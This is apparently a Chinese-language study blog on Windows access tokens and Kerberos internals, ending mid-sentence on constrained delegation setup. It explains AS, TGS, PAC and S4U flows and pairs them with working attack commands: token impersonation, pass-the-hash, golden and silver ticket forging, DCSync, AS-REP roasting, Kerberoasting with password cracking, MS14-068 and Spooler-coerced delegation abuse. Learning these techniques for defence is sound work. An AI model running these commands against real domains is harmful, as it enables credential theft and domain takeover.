一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。\n​    当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。\nWindows Access Token组成\n用户帐户的安全标识符(SID)\n用户所属的组的SID\n用于标识当前登录会话的登录SID\n用户或用户组所拥有的权限列表\n所有者SID\n主要组的SID\n访问控制列表\n访问令牌的来源\n令牌是主要令牌还是模拟令牌\n限制SID的可选列表\n目前的模拟等级\n其他统计数据\n\nWindows Access Token – SID (Security Identifiers)安全标识符安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有固定的SID\nSID的表现形式:\n\n域SID-用户ID\n计算机SID-用户ID\nSID列表都会存储在域控的AD或者计算机本地账户数据库中。\n\nWindows Access Token产生过程每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreateProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。\nWindows Access Token令牌假冒实战当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。\n可以使用多种工具查看目前系统上存在的模拟令牌:\n\nIncognito\nPowershell - Invoke-TokenManipulation.ps1\nCobalt Strike - steal_token\n\nmeterpreter &gt; getsystemmeterpreter &gt; load incognito meterpreter &gt; list_tokens –uDelegation Tokens Available ============================== NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEM PAYLOADS\\Administrator PAYLOADS\\w7meterpreter &gt; impersonate_token &quot;PAYLOADS\\\\Administrator”[+] Delegation token available[+] Successfully impersonated user PAYLOADS\\Administrator\n\n\nWindows Access Token令牌假冒防御禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。\n如果想清除假冒令牌，重启服务器即可。\nFrom 倾旋上面的大部分来源于倾旋大佬，跟着大佬学习，我进行了一些图片标注并且部分地方加入了自己的理解。光看大佬们的博客真的不够，很多一样的东西自己写自己理解感觉也是不一样的。下面我会再补充一些其他的，将各路大佬的资料和我自己的内容整合\nKerberos篇补充Kerberos流程再复习​    在Kerberos协议中主要是有三个角色的存在：\n\n访问服务的Client(以下表述为Client 或者用户)\n提供服务的Server(以下表述为服务)\nKDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍\n\n​    其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。\n​    在一个域中，如何才能知道某个域用户所拥有的权限呢？自然是需要提供User的SID和所在组Group的SID。必须了解的一个前提是，KDC，A、B三者中，B只信任KDC所提供的关于A到底是什么权限，所以在域初始时，KDC上拥有A和B的权限。现在需要解决的是，KDC必须告诉B关于A的权限，这样B验证A的权限后才能决定让不让A访问自身的网络资源。\n​    为了让Server-B能知道Client-A所具有的权限，微软在KRB_AS_REP中的TGT中增加了Client-A的PAC（特权属性证书 ），也就是Client-A的权限，包括Client-A的SID、Group的SID：\n​    可以看到被KDC加密的TGT中，不仅包括了被加密的Session Keya-kdc，还包括KRB_AS_REQ中申请者（Client-A）的权限属性证书，为了防止该特权证书被篡改（即使被KDC加密，Client-A也无法轻易解密，但谁也无法保证绝对的安全），在PAC的尾部添加了两个检验ServerSignature和KDCSignature:\n​    在这里serber Signature和KDC Signature对Client而言，Server代表的是TGS服务，KDC代表的是AS服务（AS作为Client-A与TGS的第三方信任机构）。但是AS服务与TGS服务具有相同的krgtbt账号的密码生成的，当然，整个TGT也是用KDC的密码也就是krbtgt通过它账号密码加密的，他们三者不同的是，用的算法和加密内容有所不同。\n​    微软是这样打算的，无论如何也要把PAC从KDC传送到Server-B，为了在Kerberos认证过程中实现，微软选择了如下做法：\n​    将PAC放在TGT中加密后从AS服务经Client-A中转给TGS服务，再放在由TGS服务返回的ServiceTicket中加密后经Client-A中转给Serber-B\n\n\n\nAS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳\n\nAS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。\n\nTGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求\n\nTGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)\n\nAP_REQ: Client拿着TGS票据去请求服务\n\nAP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。\n\n\n​    注意：这个和上面的详细流程有略微不同哦，因为PAC的原因\n​    在这里需要注意的是，在KRB_TGS_REQ阶段，携带PAC的TGT被TGS服务接收后，认证Client-A的合法性后（解密Authenticator符合要求）会将PAC解密出来，验证尾部两个签名的合法性，如何合法则认为PAC没有被篡改，于是重新在PAC的尾部更换了另外两个签名，一个是Server Signature，这次是以Server-B的密码副本生成的签名(因为对于Client-A和Server-B，这次的第三方机构是TGS)，另一个是KDC Signature，这次不再使用KDC的长期有效的key，而是使用在AS阶段生成的短期有效的SessionKeya-b。最后称为 新的PAC被拷贝在ST中被加密起来。\n​    最后绕来绕去，KDC上所拥有的关于Client-A的权限证书PAC终于发给了Server-B，Server-B在对Client-A进行认证的同时，也能判断Client-A有没有访问网络资源的权限。\nAS_REQ &amp; AS_REP引出的问题1. Pass the hash​    上面NTLM的时候讲过\nsekurlsa::ekeyssekurlsa::pth /user:testadmin /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c\n\n\n\n2. 用户名枚举​    当我们在AS_REQ Body里的用户名不正确时，AS_error的回显是不一样的\n​    用户名存在，密码错误的情况下用户名存在，密码错误的情况下：\n\n​    用户名不存在的情况下：\n\n​    工具：\nmsf auxiliary/gather/kerberos_enumusersjava –jar kerbguess.jar –r [domain] –d [user list] –s [DC IP]nmap –p 88 –script-args krb5-enum-users.realm=&#x27;[domain]&#x27;,userdb=[user list] [DC IP]\n\n\n\n3. Password Spraying​    对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。\n密码正确：\n\n密码错误：\n\n4. AS-REP Roasting​    对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令。\n​    利用前提：域用户设置了选项”Do not require Kerberos preauthentication”。通常情况下，该选项默认不会开启。\n​    如果看过我的语雀或者对域有一定了解，我在这里说明一下后面会讲到的三种攻击方式的区别：\n·  AS-REP Roasting：获取用户hash然后离线暴力破解\n·  Kerberoasting：获取应用服务hash然后暴力破解\n·  黄金票据：通过假冒域中不存在的用户来访问应用服务\n\n​    在本地系统上，利用下面这条powershell命令，可以很容易遍历出哪些用户开启了“Do not require pre-authentication”\nGet-ADUser -Filter &#x27;useraccountcontrol -band 4194304&#x27; -Properties useraccountcontrol | Format-Table name\n\n\n工具：\n\nhttps://github.com/GhostPack/Rubeus\n\nRubeus.exe asreproast\n\n下载完成后，运行上面这条命令，会得到用户账户的hash值，这个key值用于加密时间戳。将这个值保存下来进行离线爆破密码\n\nRubeus.exe asreproast /format:john /outfile: hashes.txt\n\n这条命令会将提取到的hash值存储到一个txt文件中，存储格式是John这款工具可以破解的格式。\n\n\nGetNPUsers.py这个脚本是Impacket工具套件中的其中一个，它可以列举出哪些用户设置了“Do not require Kerberos pre-authentication”，并获得TGTs。同样的，你也可以保存hash到文件中，然后利用John the ripper进行破解，如下图：\n\npython GetNPUsers.py -dc-ip 192.168.1.105 ignite.local/ -usersfile users.txt -format john -outputfile hashesjohn –wordlist=/usr/share/wordlists/rockyou.txt hashes\n\n\n5. 黄金票据​    前面讲过，在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的TGT票据。\n​    制作金票需要先导出来krbtgt的hash\nlsadump::dcsync /domain:test.local /user:krbtgt\n\n​    然后需要sid和krbtgt的hash，这里生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz “lsadump::lsa /patch”导出。\nkerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /aes256:b4e2924c2d378eda457c2dd3810fdde0a5312354c2b26bc677dfb48e46a17fe7 /user:administrator /ticket:gold.kirbi\n\n\n​    然后我们使用这张票据就可以随意在某一台机器上ptt访问dc了。\n\n工具getTGT​    给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。这里面需要注意的是用mimikatz，kekeo，rubeus生成的凭据是以.kirbi后缀的。impacket 生成的凭据的后缀是.ccache。\n​    可以通过https://github.com/rvazarkar/KrbCredExport.git里面的脚本转化为kirbi\n\nGetNPUsers​    上面介绍了\nticketer​    该脚本将从零开始或基于模板（从KDC合法请求）创建Golden / Silver票据，允许您自定义PAC_LOGON_INFO结构中设置的一些参数，特别是组，ExtraSids，持续时间等，票据格式是ccache.\n​    首先获取krbtgt的hash首先获取krbtgt的hash\n\n​    获取域的sid获取域的sid\n\n​    制作黄金票据制作黄金票据\n\nRubeus​    上面已介绍\nMimikatzkerberos::goldenmimikatz的kerberos::golden模块可以用于制作黄金票据,票据格式是.kirbi\n首先获取krbtgt的hash\n\n获取域的sid\n\n制作黄金票据\nDomainPasswordSpray​    DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。\n\nTGS_REQ &amp; TGS_REP​    在TGS_REQ &amp; TGS_REP阶段，用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限，KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。考虑到这两个扩展是TGS的子协议。\n​    TGS_REQ这个阶段不需要账号密码，需要AS_REP获取到的TGT凭据。\n\nTGS_REQ1. msg-type​    类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)类型。\n2. PA-DATA​    正常的TGS_REQ的请求需要用到有\n​    1）AP_REQ\n\n这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据，就放在这个结构体里面。\nKDC校验TGT票据，如果票据正确，就返回TGS票据。\n​    2）PA_FPR_USER\n\n类型是S4U2SELF，值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。\nS4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。\n​    3） PA_PAC_OPTIONS\n\n​    类型是PA_PAC_OPTIONS\n​    值是以下flag的组合\n​    – Claims(0)\n​    – Branch Aware(1)\n​    – Forward to Full DC(2)\n​    – Resource-based Constrained Delegation (3)\n​    S4U2proxy 必须扩展PA-PAC-OPTIONS结构。S4U2proxy 必须扩展PA-PAC-OPTIONS结构。\n​    如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。\n3. REQ_BODY1）sname\n这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。\n2）AddtionTicket\n\n附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。\nTGS_REP\n1. msg-typeAS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)\n2. ticket这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash。\n3. Enc_part这个enc_part不是ticket里面的enc_part！\n\n​    这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。\n\nS4U2SELF​    S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的\n​    s4u2self的过程如下s4u2self的过程如下\n\n​    前提条件是服务已经有通过KDC验证的TGT，如下图，需要有TGT。\n\n​    \n​    在步骤1中, 服务(JACKSON-PC$)使用S4U2self扩展名代表用户(administrator)获得针对服务本身(JACKSON-PC$)的服务票证。该服务将填写 PA_FOR_USER 数据结构,类型为S4U2SELF，并将KRB_TGS_REQ消息发送到TGS。 如下图，由于服务JACKSON-PC$代表用户向服务本身(也是JACKSON-PC$)发起请求，因此这里面cname是JACKSON-PC$,sname也是JACKSON-PC$\n\n​    假定TGS支持PA_FOR_USER扩展，则TGS在步骤2中通过KRB_TGS_REP消息返回用户的服务票证。如果服务请求了可转发选项，并且TGS的本地策略允许，则TGS检验通过后必须将票证标志 字段设置为可转发，既只要满足：\n​    1）TGT是可以转发的\n\n​    2）服务配置了约束委派\n\n3）服务请求了可转发选项\n\n​    则TGS必须将票证标志 字段设置为可转发\n\n​    需要注意的是，如果用户的UserAccountControl字段中设置了USER_NOT_DELEGATED位,那么返回的TGS是永远也没法转发的。如图，当Administrator配置了敏感账户，不能被委派，返回的TGS的flag字段没有forwardable。\n\n\nS4U2PROXY​    s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。\n​    s4u2proxy的过程如下图所示:\n\n​    在步骤1中，服务1试图代表用户获取服务2的服务票证。服务1发送KRB_TGS_REQ消息，并将用户的服务1服务票证作为 请求中的AddtionTicket。只要满足以下条件：\n1）拥有来自用户的授权( 在S4U2SELF阶段获得的TGS票据)，放在AddtionTicket里面。\n\n2）在请求的kdc-options中设置了CNAME-IN-ADDL-TKT标志。\n\n3）服务请求了可转发选项\n\n4）服务1 有到服务2的约束委派，将服务2的SPN放在sname里面。\n\n如果满足这些条件，则在步骤2中TGS会制作KRB_TGS_REP消息以返回服务票证。可转发标志将在服务票证中设置。\n\n​    有个点需要注意的是，前面在S4U2SELF里面提到，在满足一定的条件之后，S4U2SELF返回的票据是可以转发的，这个票据作为S4U2PROXY的AddtionTicket，有些文章里面会说，S4U2PROXY要求AddtionTicket里面的票据一定要是可转发的，否则S4U2PROXY生成的票据是不可以转发的。这个说法在引入可资源约束委派的情况下，是不成立的，下面分情况具体说下。\n1）AddtionTicket里面的票据是可转发的\n如果AddtionTicket里面的票据是可转发的，只要KDC Options里面置forwarable位，那么返回的票据必须置为可转发的\n\n2）AddtionTicket里面的票据是不可转发的\n如果AddtionTicket中的服务票据未设置为可转发的，则KDC必须返回状态为STATUS_NO_MATCH的KRB-ERR-BADOPTION选项。除了一种情况之外，就是配置了服务1到服务2 的基于资源的约束委派，且PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位(这一例外的前提是S4U2SELF阶段模拟的用户没被设置为对委派敏感，对委派敏感的判断在S4U2SELF阶段，而不是S4U2PROXY阶段)。\nAddtionTicket里面的票据是不可转发的\n\n配置了服务1到服务2 的基于资源的约束委派\n\nPA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位\n\n返回的TGS票据是可转发的\n\nPAC介绍​    网上很多版本的kerberos的流程是\n\n用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据\n\n用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据\n\n用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。\n\n\n​    上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。\n​    为了解决上面的这个问题，微软引进了PAC，引进PAC之后的kerberos流程变成\n\n用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。\n\n\n\n用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据。\n\n用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）就允许用户访问。\n\n\n​    特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。\nPAC安全问题MS14-068\n在KDC机构对PAC进行验证时，对于PAC尾部的签名算法，虽然原理上规定必须是带有Key的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。\nPAC没有被放在TGT中，而是放在了TGS_REQ数据包的其它地方。但可笑的是，KDC在实现上竟然允许这样的构造，也就是说，KDC能够正确解析出没有放在其它地方的PAC信息。\n只要TGS_REQ按照刚才漏洞要求设置，KDC服务器会做出令人吃惊的事情：它不仅会从Authenticator中取出来subkey把PAC信息解密并利用客户端设定的签名算法验证签名，同时将另外的TGT进行解密得到SessionKeya-kdc；\n在验证成功后，把解密的PAC信息的尾部，重新采用自身Server_key和KDC_key生成一个带Key的签名，把SessionKeya-kdc用subkey加密，从而组合成了一个新的TGT返回给Client-A\n\n工具：\nkekeo\n\n\n\nimpacket\n\n\n3. pykek全称是Python Kerberos Exploitation Kit\n应该是ms14068漏洞利用，使用的最广泛的一个，一般常用的ms14068.exe，就是由他打包而成的\n先获取sid\n\n拼接成S-1-5-21-866784659-4049716574-3063611777-1104\n生成tgt\n\n验证tgt是否具备域管权限\n\nTGS_REQ &amp; TGS_REP引出的问题白银票据​    在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。\n​    此处使用dc的cifs服务做演示。首先需要获得如下信息：\n\n/domain\n/sid\n/target:目标服务器的域名全称，此处为域控的全称\n/service：目标服务器上面的kerberos服务，此处为cifs\n/rc4：计算机账户的NTLM hash，域控主机的计算机账户\n/user：要伪造的用户名，此处可用silver测试\n\nsekurlsa::logonpasswords导出服务DC$账户的ntlm hash\n[\nkerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /target:dc.test.local /service:cifs /rc4:9150e40e4ec936a15baf384ca382a3df /user:dc$ /ptt\n\n\nKerberoasting​    在之前Kerberos的TGS_REQ &amp; TGS_REP过程中提到，只要用户提供的票据正确，服务就会返回自身hash加密的tgs票据，那么如果我们有一个域用户，就可以申请服务的tgs票据，本地爆破服务hash得到服务密码，这个过程叫做Kerberoasting。而在域中，服务通过spn来作为唯一标识。\nSPN简介​    SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN\n​    SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下\n​    当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下\n​    当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下\nSPN格式serviceclass/host:port/servicename\n\n\nserviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等\nhost有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01\n如果服务运行在默认端口上，则端口号(port)可以省略\n\n通过 setspn -A MSSQLSvc/DM.test.local:1433 sqladmin 注册一个名为MSSQLSvc的SPN，将他分配给sqladmin这个域管账户\n\nSPN查询​    spn查询实际上是通过ldap协议查询的，那么当前用户必须是域用户或者是机器账户。\nsetspn -q */*setspn -T test.local -q */*\n\n\nCN=Users的是域账户注册的SPN，CN=Computers是机器账户。\n​    域内的任意主机都可以查询SPN，任何一个域用户都可以申请TGS票据。而我们爆破的话应该选择域用户进行爆破，因为机器用户的口令无法远程链接。\n那么Kerberoasting思路如下：\n\n查询SPN寻找在Users下并且是高权限域用户的服务\n请求并导出TGS\n爆破\n\nkerberoasting基本上将服务器上运行的服务映射到它正在运行的帐户，以便它可以执行/接受 kerberos 身份验证。通常，这些服务，如“CIFS”（Windows 共享）在计算机帐户的上下文中运行。\n列出SPN\npython3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out\n\n\n它还给了我一张票，我可以尝试暴力解密以获取用户的密码：\n\njohn破解：\njohn GetUserSPNs.out --wordlist=/usr/share/wordlists/rockyou.txt\n\n\n委派将我的权限给服务账户\n域委派​    一句话概况，委派就是将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。将我的权限给服务账户。\n​    需要注意的一点是接受委派的用户只能是服务账户或者机器账户\n\n机器账户:活动目录中的computers组内的计算机，也被称为机器账号。\n\n\n\n服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。\n\n非约束委派在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派\n一个经典的例子如图\n\njack需要登陆到后台文件服务器，经过Kerberos认证的过程如下：\n\njack以Kerberos协议认证登录，将凭证发送给websvc\nwebsvc使用jack的凭证向KDC发起Kerberos申请TGT。\nKDC检查websvc的委派属性，如果websvc可以委派，则返回可转发的jack的TGT。\nwebsvc收到可转发TGT之后，使用该TGT向KDC申请可以访问后台文件服务器的TGS票据。\nKDC检查websvc的委派属性，如果可以委派，并且权限允许，那么返回jack访问服务的TGS票据。\nwebsvc使用jack的服务TGS票据请求后台文件服务器。\n\n一个微软的官方流程图：\n\n具体说明：\nWIN2016 域控 hostname：DC ip：10.150.127.166\nwin2016 域机器 hostname：WEB ip：10.150.127.168\n域用户 many asd123!\n设置非约束性委派机器账户的非约束性委派设置\n服务账户的非约束委派设置many是普通域用户 默认是没有委派设置的\n\n给域用户注册SPN，加上spn后表示其为服务用户。\nsetspn -U -A priv/test many\n\n在域控上执行\n\n然后查看many用户\n加上spn之后委派的选项卡才会出现，因为只有服务账户和计算机账户才可以被委派。\n\n已经有了委派属性然后设置为非约束委派\n查询域内设置了非约束委派的服务账户在WEB上执行\nAdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn\n\n\n查询域内设置了非约束委派的机器账户AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn\n\n\n域内域控机器账户默认设置了非约束委派\nadfind和ldapsearch都可以查询。\n非约束委派利用方式1用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。\n环境：WEB可委派，DC是域控。\n先查看WEB上的票据\nmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit\n\n\n\n在DC上通过WinRM访问Web\n\n此时DM上已经缓存了从DC登录过来的域管的ticket，mimikatz导出\n\n导入票据\nmimikatz.exe &quot;kerberos::ptt [0;36eb98]-2-0-60a10000-Administrator@krbtgt-HAISHI.COM.kirbi&quot; &quot;exit&quot;\n\n\n再次访问\n\n清除缓存\n\n\n非约束委派利用方式2（Spooler打印机服务）​    利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex)方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。\n工具：https://github.com/leechristensen/SpoolSample\n​    需要以域用户运行SpoolSample，需要开启Print Spooler服务，该服务默认自启动。\n\nSpoolSample.exe DC DM\n\n使DC强制访问DM认证，同时使用rubeus监听来自DC的4624登录日志\nRubeus.exe monitor /interval:1 /filteruser:dc$\n\n\n使用Rubues导入base64的ticket\n.\\Rubeus.exe ptt /ticket:base64\n\n此时导出的ticket就有DC的TGT了\n\n用mimikatz ptt就完事\n\n约束性委派​    因为非约束委派的不安全性，约束委派应运而生。在2003之后微软引入了非约束委派，对Kerberos引入S4U，包含了两个子协议S4U2self、S4U2proxy。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)，S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。\n​    在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。\nS4U2Self​    允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。\n(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。\n(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。\n(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。\n(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。\n尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。\nS4U2Proxy​    允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。\n(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。\n(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。\n(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。\n(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。\n(9) service2 响应步骤 8 的请求。\n(10) service1 响应用户对步骤 5 中的请求。\n\n​    具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。\n​    如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意用户(如 domain\\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）。\n​    此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，还可以访问使用与模拟帐户权限允许的任何服务。（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync。\n​    如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。\n约束性委派配置：在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。\n服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。\n1、先注册一个 SPN：\nsetspn -U -A SQLServer/redteam.red/MSSQL redteam-iis\n\n复制\n\n此时用户 redteam-iis 已注册 SPN：\nsetspn -L redteam-iis\n\n复制\n\n2、然后配置服务账号：\n\n3、添加一个服务：\n\n4、输入域控主机名 ad-2008 然后点击检查名称：\n\n5、选择服务为 